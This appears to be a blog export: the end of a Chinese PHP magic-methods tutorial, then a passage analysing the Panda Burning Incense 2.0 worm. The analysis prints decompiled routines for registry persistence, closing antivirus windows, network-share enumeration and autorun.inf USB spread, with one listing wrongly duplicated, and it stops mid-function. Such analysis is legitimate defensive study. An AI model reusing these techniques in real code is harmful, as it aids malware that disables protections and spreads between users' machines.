1这可是一个对象哦 当然，如果你执意要将对象当函数方法使用，那么会得到下面结果： 1Fatal error: Function name must be a string in D:\\phpStudy\\WWW\\test\\index.php on line 18 十三、 __set_state()，调用var_export()导出类时，此静态方法会被调用。作用： 1自 PHP 5.1.0 起，当调用 var_export() 导出类时，此静态方法会被自动调用。 参数： 1本方法的唯一参数是一个数组，其中包含按 array('property' =&gt; value, ...) 格式排列的类属性。 下面我们先来看看在没有加 __set_state() 情况按下，代码及运行结果如何： 上代码： 123456789101112131415161718&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; }}$person = new Person('小明'); // 初始赋值var_export($person); 看结果： 1Person::__set_state(array( 'sex' =&gt; '男', 'name' =&gt; '小明', 'age' =&gt; 25, )) 很明显，将对象中的属性都打印出来了 加了 __set_state() 之后： 继续上代码： 1234567891011121314151617181920212223242526&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public static function __set_state($an_array) { $a = new Person(); $a-&gt;name = $an_array['name']; return $a; }}$person = new Person('小明'); // 初始赋值$person-&gt;name = '小红';var_export($person); 继续看结果： 1Person::__set_state(array( 'sex' =&gt; '男', 'name' =&gt; '小红', 'age' =&gt; 25, )) 十四、 __clone()，当对象复制完成时调用在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果你有一个 GTK 窗口对象，该对象持有窗口相关的资源。你可能会想复制一个新的窗口，保持所有属性与原来的窗口相同，但必须是一个新的对象（因为如果不是新的对象，那么一个窗口中的改变就会影响到另一个窗口）。还有一种情况：如果对象 A 中保存着对象 B 的引用，当你复制对象 A 时，你想其中使用的对象不再是对象 B 而是 B 的一个副本，那么你必须得到对象 A 的一个副本。 作用： 1对象复制可以通过 clone 关键字来完成（如果可能，这将调用对象的 __clone() 方法）。对象中的 __clone() 方法不能被直接调用。 语法： 1$copy_of_object = clone $object; 注意： 123当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值（如果有必要的话）。 看代码： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __clone() { echo __METHOD__.&quot;你正在克隆对象&lt;br&gt;&quot;; }}$person = new Person('小明'); // 初始赋值$person2 = clone $person;var_dump('persion1:');var_dump($person);echo '&lt;br&gt;';var_dump('persion2:');var_dump($person2); 看结果： 123Person::__clone你正在克隆对象string(9) &quot;persion1:&quot; object(Person)#1 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) } string(9) &quot;persion2:&quot; object(Person)#2 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) } 克隆成功。 十五、__autoload()，尝试加载未定义的类作用： 1你可以通过定义这个函数来启用类的自动加载。 在魔术函数 __autoload() 方法出现以前，如果你要在一个程序文件中实例化100个对象，那么你必须用include或者require包含进来100个类文件，或者你把这100个类定义在同一个类文件中 —— 相信这个文件一定会非常大，然后你就痛苦了。 但是有了 __autoload() 方法，以后就不必为此大伤脑筋了，这个类会在你实例化对象之前自动加载制定的文件。 还是通过例子来看看吧： 先看看以往的方式： 123456789101112131415161718/** * 文件non_autoload.php */ require_once('project/class/A.php'); require_once('project/class/B.php'); require_once('project/class/C.php'); if (条件A) { $a = new A(); $b = new B(); $c = new C(); // … 业务逻辑 } else if (条件B) { $a = newA(); $b = new B(); // … 业务逻辑 } 看到了吗？不用100个，只是3个看起来就有点烦了。而且这样就会有一个问题：如果脚本执行“条件B”这个分支时，C.php这个文件其实没有必要包含。因为，任何一个被包含的文件，无论是否使用，均会被php引擎编译。如果不使用，却被编译，这样可以被视作一种资源浪费。更进一步，如果C.php包含了D.php，D.php包含了E.php。并且大部分情况都执行“条件B”分支，那么就会浪费一部分资源去编译C.php,D.php,E.php三个“无用”的文件。 那么如果使用 __autoload() 方式呢？ 1234567891011121314151617181920/** * 文件autoload_demo.php */ function __autoload($className) { $filePath = “project/class/{$className}.php”; if (is_readable($filePath)) { require($filePath); } } if (条件A) { $a = new A(); $b = new B(); $c = new C(); // … 业务逻辑 } else if (条件B) { $a = newA(); $b = new B(); // … 业务逻辑 } ok,不论效率怎么用，最起码界面看起来舒服多了，没有太多冗余的代。 再来看看这里的效率如何，我们分析下： 当php引擎第一次使用类A，但是找不到时，会自动调用 __autoload 方法，并将类名“A”作为参数传入。所以，我们在 __autoload() 中需要的做的就是根据类名，找到相应的文件，并包含进来，如果我们的方法也找不到，那么php引擎就会报错了。 注意： 1这里可以只用require，因为一旦包含进来后，php引擎再遇到类A时，将不会调用__autoload，而是直接使用内存中的类A，不会导致多次包含。 扩展： 1其实php发展到今天，已经有将 `spl_autoload_register` — 注册给定的函数作为 __autoload 的实现了，但是这个不在啊本文讲解之内，有兴趣可以自行看手册。 十六、__debugInfo()，打印所需调试信息注意： 1该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。 看代码： 12345678910111213141516171819&lt;?phpclass C { private $prop; public function __construct($val) { $this-&gt;prop = $val; } /** * @return array */ public function __debugInfo() { return [ 'propSquared' =&gt; $this-&gt;prop ** 2, ]; }}var_dump(new C(42)); 结果： 1object(C)#1 (1) { [&quot;propSquared&quot;]=&gt; int(1764) } 再次注意： 1这里的 `**` 是乘方的意思，也是在PHP5.6.0及其以上才可以使用，详情请查看PHP手册","link":"/2025/12/11/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"","text":"传统病毒反分析思路 前言本文对传统病毒（熊猫烧香2.0）进行了系统性逆向分析。该病毒活跃于2006–2007年，曾在中国造成大规模感染，其核心特征包括：通过U盘和局域网自动传播、感染可执行文件并替换桌面图标为“熊猫烧香”、强力对抗杀毒软件、以及多重持久化机制。本报告详细剖析了其注册表自启动、窗口检测关闭安全工具、网络共享枚举、移动存储自动运行等关键技术模块，并结合现代安全视角评估其当前威胁等级，同时提供完整的应急处置与清除方案，为理解传统蠕虫病毒的攻击范式及防御演进提供重要参考。 熊猫烧香2.01. 基本信息文件名: setup.exe 文件哈希值: MD5: ad41ec81ab55c17397d3d6039752b0fd SHA256: aee99bc628b7c16a418560d4712f7dabfe8c273b4b78d8dbf804ccd7b6ea15e1 CRC32: 0x902e661b 文件大小: 59KB 2. 病毒特征通过逆向分析，确认该样本是熊猫烧香2.0病毒，具有以下特征： 2.1 进程与服务 创建恶意进程 spoclsv.exe 并将其写入 drivers 目录 使用 Windows 系统服务名称伪装自身 2.2 自启动机制 修改注册表 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 创建 Desktop_.ini 文件实现持久化 在所有用户的启动目录添加恶意程序 创建 autorun.inf 文件实现U盘等移动存储设备自动运行 sub_4052CC–Windows 注册表写入操作，主要用于向指定注册表路径写入一个字符串值（REG_SZ），实现持久化 1234567891011121314151617LSTATUS __userpurge sub_4052CC@&lt;eax&gt;(LPCSTR lpValueName@&lt;ecx&gt;, LPCSTR lpSubKey@&lt;edx&gt;, HKEY hKey@&lt;eax&gt;, BYTE *lpData)//lpValueName要创建的注册表的值名（如 &quot;MyBackdoor&quot;）//LPCSTR lpSubKey@&lt;edx&gt;子健路径（如 &quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;）//HKEY hKey@&lt;eax&gt; [in] 根键（如 HKEY_CURRENT_USER 或 HKEY_LOCAL_MACHINE）//BYTE *lpData [in] 要写入的数据（通常是字符串，如 &quot;C:\\\\malware.exe&quot;）{ int v5; // eax DWORD dwDisposition; // [esp+8h] [ebp-8h] BYREF HKEY phkResult; // [esp+Ch] [ebp-4h] BYREF phkResult = 0; dwDisposition = 1; RegCreateKeyExA(hKey, lpSubKey, 0, 0, 0, 0xF003Fu, 0, &amp;phkResult, &amp;dwDisposition);//创建打开注册表子键 v5 = sub_4052B4(); //获取数据长度 RegSetValueExA(phkResult, lpValueName, 0, 1u, lpData, v5 + 1);//写入注册表值 return RegCloseKey_0(phkResult); //关闭句柄并返回} 123456上面的详细流程通过 RegCreateKeyExA 创建注册表项操作路径： Software\\Microsoft\\Windows\\CurrentVersion\\Run设置 svcshare 键值指向病毒程序使用 RegSetValueExA 写入键值数据最后通过 RegCloseKey_0 关闭注册表句柄 启动文件夹自启动 相关地址 ：0x40a584、0x40a610、0x40a640 字符串引用 ： Start Menu\\Programs\\Startup 机制 ：将病毒文件复制到系统启动文件夹，实现开机自动运行 2.3 反杀毒能力 检测并终止多种杀毒软件进程，包括： 瑞星系列: Ravmond.exe, CCenter.exe, RavTask.exe 等 金山系列: KVXP.kxp, KvMonXP.kxp 等 诺顿系列: Symantec AntiVirus 相关进程 McAfee、NOD32等其他安全软件 禁用任务管理器和注册表编辑器 修改系统设置隐藏文件 sub_4062C8–杀毒软件检测与终止 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199int __stdcall sub_4062C8(){ HWND hWndChildAfter; // ebx HWND hWndParent; // edi HWND hWndParent_1; // edi HWND hWndParent_2; // eax HWND hWnd; // eax BYTE bScan; // al BYTE bScan_1; // al BYTE bScan_2; // al BYTE bScan_3; // al BYTE bScan_4; // al BYTE bScan_5; // al BYTE bScan_6; // al BYTE bScan_7; // al unsigned int v14[6]; // [esp-Ch] [ebp-108h] BYREF CHAR String[101]; // [esp+97h] [ebp-65h] BYREF int savedregs; // [esp+FCh] [ebp+0h] BYREF v14[2] = (unsigned int)&amp;savedregs; v14[1] = (unsigned int)&amp;loc_406BF1; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); sub_406218(); hWndChildAfter = 0; hWndParent = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent, hWndChildAfter, 0, 0); GetWindowTextA(hWndChildAfter, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); } while ( hWndChildAfter ); hWndParent_1 = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent_1, hWndChildAfter, 0, 0); hWndParent_2 = FindWindowExA(hWndChildAfter, 0, &quot;msctls_statusbar32&quot;, 0); hWnd = FindWindowExA(hWndParent_2, 0, 0, 0); GetWindowTextA(hWnd, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) { PostMessageA(hWndChildAfter, 0x12u, 0, 0); bScan = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan, 0, 0); bScan_1 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_1, 0, 0); bScan_2 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_2, 0, 0); bScan_3 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_3, 2u, 0); bScan_4 = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan_4, 2u, 0); bScan_5 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_5, 2u, 0); if ( FindWindowA(0, &quot;IceSword&quot;) ) { bScan_6 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_6, 0, 0); bScan_7 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_7, 2u, 0); } } } while ( hWndChildAfter ); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); __writefsdword(0, v14[0]); return sub_403C68(&amp;loc_406BF8);} 1234567sub_4041B4() 字符串匹配函数，检测窗口标题是否包含：&quot;任务管理器&quot;&quot;Process Explorer&quot;&quot;ProcMon&quot;&quot;Wireshark&quot;&quot;调试器&quot;&quot;IceSword&quot;（古老的著名内核工具，现在win10，11都不用这个了）专门检测 IceSword 并模拟按键（简单来说就是不让你打开得得功能） sub_4060D4–Windows 异常处理（SEH）框架 + 资源枚举循环 的函数，用于枚举系统资源（如窗口、进程、文件、驱动） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199int __stdcall sub_4062C8(){ HWND hWndChildAfter; // ebx HWND hWndParent; // edi HWND hWndParent_1; // edi HWND hWndParent_2; // eax HWND hWnd; // eax BYTE bScan; // al BYTE bScan_1; // al BYTE bScan_2; // al BYTE bScan_3; // al BYTE bScan_4; // al BYTE bScan_5; // al BYTE bScan_6; // al BYTE bScan_7; // al unsigned int v14[6]; // [esp-Ch] [ebp-108h] BYREF CHAR String[101]; // [esp+97h] [ebp-65h] BYREF int savedregs; // [esp+FCh] [ebp+0h] BYREF v14[2] = (unsigned int)&amp;savedregs; v14[1] = (unsigned int)&amp;loc_406BF1; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); sub_406218(); hWndChildAfter = 0; hWndParent = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent, hWndChildAfter, 0, 0); GetWindowTextA(hWndChildAfter, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); } while ( hWndChildAfter ); hWndParent_1 = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent_1, hWndChildAfter, 0, 0); hWndParent_2 = FindWindowExA(hWndChildAfter, 0, &quot;msctls_statusbar32&quot;, 0); hWnd = FindWindowExA(hWndParent_2, 0, 0, 0); GetWindowTextA(hWnd, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) { PostMessageA(hWndChildAfter, 0x12u, 0, 0); bScan = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan, 0, 0); bScan_1 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_1, 0, 0); bScan_2 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_2, 0, 0); bScan_3 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_3, 2u, 0); bScan_4 = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan_4, 2u, 0); bScan_5 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_5, 2u, 0); if ( FindWindowA(0, &quot;IceSword&quot;) ) { bScan_6 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_6, 0, 0); bScan_7 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_7, 2u, 0); } } } while ( hWndChildAfter ); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); __writefsdword(0, v14[0]); return sub_403C68(&amp;loc_406BF8);} 使用 FindWindowExA 枚举系统窗口 通过 GetWindowTextA 获取窗口标题 调用 sub_4041B4 检测窗口标题中的杀毒软件特征字符串 当检测到杀毒软件时，使用 PostMessageA 发送 WM_DESTROY （0x12）消息关闭窗口 这些个方法已经过时了 12345678910IceSword 是 2005–2010 年流行的内核工具，早就已经停止更新，现代 Windows（Win10/11）根本无法运行行为特征库中早已收录：FindWindow + PostMessage(WM_CLOSE) + &quot;任务管理器&quot;keybd_event(VK_CONTROL) + VK_MENU + 'D'高频调用 CreateToolhelp32Snapshot + RegSetValueEx云沙箱（如 ANY.RUN、Hybrid Analysis）会：模拟打开“任务管理器”窗口观察样本是否尝试关闭它→ 直接标记为恶意 病毒内置了多种杀毒软件的特征字符串进行检测： NOD32 Symantec Mcshield navapsvc VirusScan KAV (卡巴斯基) 键盘模拟对抗 使用 keybd_event 模拟键盘操作来干扰杀毒软件的正常运行 通过异常处理机制避免被杀毒软件检测到 接下来就可以操作文件感染（桌面全变成熊猫烧香图标），然后去进程注入 1234567891011121314151617181920212223242526272829303132333435363738394041424344int *__usercall sub_4060D4@&lt;eax&gt;(int a1@&lt;eax&gt;){ int *p_n296; // ebx void *hObject; // esi bool i; // al char v4; // zf unsigned int v6[10]; // [esp-Ch] [ebp-154h] BYREF int n296; // [esp+1Ch] [ebp-12Ch] BYREF _DWORD v8[66]; // [esp+40h] [ebp-108h] BYREF int savedregs; // [esp+148h] [ebp+0h] BYREF memset(&amp;v6[5], 0, 20); v8[65] = a1; sub_4040BC(); p_n296 = &amp;n296; v6[2] = (unsigned int)&amp;savedregs; v6[1] = (unsigned int)&amp;loc_406206; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); hObject = (void *)sub_405028(); n296 = 296; for ( i = sub_405048() != 0; i; i = sub_405068() != 0 ) { sub_406028(); sub_405FA8(); sub_403EB4(260, v8); sub_406028(); sub_405FA8(); sub_404018(); if ( v4 ) { p_n296 = (int *)sub_4060B4(); CloseHandle_0(hObject); goto LABEL_7; } } CloseHandle_0(hObject); LOBYTE(p_n296) = 1;LABEL_7: __writefsdword(0, v6[0]); sub_403C68(&amp;loc_40620D); sub_403C44(); return p_n296;} 2.4 传播机制 移动存储传播: 通过U盘、移动硬盘等设备传播 网络共享传播: 访问 admin$ 共享 使用 NetShareEnum 枚举网络共享 创建 svcshare 共享 局域网传播: 扫描局域网内的其他计算机 sub_40B768函数–负责网络传播 1234567891011121314151617FARPROC sub_40B768(){ HMODULE hModule; FARPROC result; // 1. 加载 netapi32.dll（Windows 网络管理 API 库） hModule = LoadLibraryA(&quot;netapi32.dll&quot;); // 2. 获取三个关键函数的地址： NetShareEnum = (DWORD (__stdcall *)(...)) GetProcAddress(hModule, &quot;NetShareEnum&quot;); NetApiBufferFree = (DWORD (__stdcall *)(LPVOID)) GetProcAddress(hModule, &quot;NetApiBufferFree&quot;); result = GetProcAddress(hModule, &quot;NetShareEnum&quot;); // 3. 保存函数地址到全局变量 dword_40E79C = (int)result; return result;} 加载网络API库 ，为后续的网络共享枚举准备。它动态加载 netapi32.dll 并获取 NetShareEnum 和 NetApiBufferFree 函数地址，这些函数用于枚举网络共享资源。病毒后续会利用这些函数来寻找局域网内的其他计算机，实现网络传播。 通过 LoadLibraryA 加载 netapi32.dll 动态库 使用 GetProcAddress 获取 NetShareEnum 和 NetApiBufferFree 函数地址 利用 NetShareEnum 枚举网络中的共享资源 通过弱密码攻击获取访问权限，然后复制病毒文件 TimerFunc函数：负责移动存储设备传播 大致流程如下 123456789sub_403F18(&quot;:\\\\setup.exe&quot;, v17); // 设置setup.exe路径sub_403F18(&quot;:\\\\autorun.inf&quot;, v16); // 设置autorun.inf路径// 创建autorun.inf文件并写入自动运行配置sub_402AD8();*off_40D2BC = 2; // 文件写入模式sub_402874(); // 可能是写入[AutoRun]部分sub_402614(); // 写入命令sub_404260(); // 可能写入OPEN=setup.exe 调用 sub_403F18 创建 setup.exe 和 autorun.inf 文件 使用 SetFileAttributesA 设置文件属性（隐藏、系统） 利用 CopyFileA 复制病毒文件到移动存储设备 通过 autorun.inf 配置自动运行项，实现设备插入自动执行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145void __stdcall TimerFunc(){ int v0; // ebx char v1; // zf const CHAR *lpFileName; // esi const CHAR *lpExistingFileName; // eax const CHAR *lpExistingFileName_1; // eax const CHAR *lpFileName_1; // esi HANDLE hObject; // eax const CHAR *lpFileName_2; // eax HANDLE hObject_1; // eax const CHAR *lpFileName_3; // eax const CHAR *lpFileName_4; // eax const CHAR *lpNewFileName; // [esp-20h] [ebp-248h] const CHAR *lpNewFileName_1; // [esp-20h] [ebp-248h] unsigned int v13[3]; // [esp-18h] [ebp-240h] BYREF unsigned int v14[2]; // [esp-Ch] [ebp-234h] BYREF int *v15; // [esp-4h] [ebp-22Ch] int v16; // [esp+24h] [ebp-204h] int v17; // [esp+28h] [ebp-200h] int v18; // [esp+34h] [ebp-1F4h] int v19; // [esp+40h] [ebp-1E8h] int v20; // [esp+224h] [ebp-4h] int savedregs; // [esp+228h] [ebp+0h] BYREF v15 = &amp;savedregs; v14[1] = (unsigned int)&amp;loc_40C016; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); v13[2] = (unsigned int)&amp;savedregs; v13[1] = (unsigned int)&amp;loc_40BFE1; v13[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v13); sub_403C44(); sub_403C44(); sub_403C44(); sub_40B9D8(); if ( v20 ) { v0 = sub_403ECC(); if ( v0 &gt;= 1 ) { do { sub_403E2C(); ((void (*)(void))sub_40B9A4)(); sub_40B9A4(v19); if ( !sub_4041B4() ) { sub_403E2C(); sub_40B9A4(v13[0]); sub_40B9A4(v18); if ( !sub_4041B4() ) { sub_403E2C(); sub_403F18(&quot;:\\\\setup.exe&quot;, v17); sub_403E2C(); sub_403F18(&quot;:\\\\autorun.inf&quot;, v16); if ( (unsigned __int8)sub_40B994() ) { sub_40277C(); sub_40BA84(); sub_40BA84(); sub_404018(); if ( !v1 ) { lpFileName = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName, 0x80u); if ( !DeleteFileA(lpFileName) ) break; 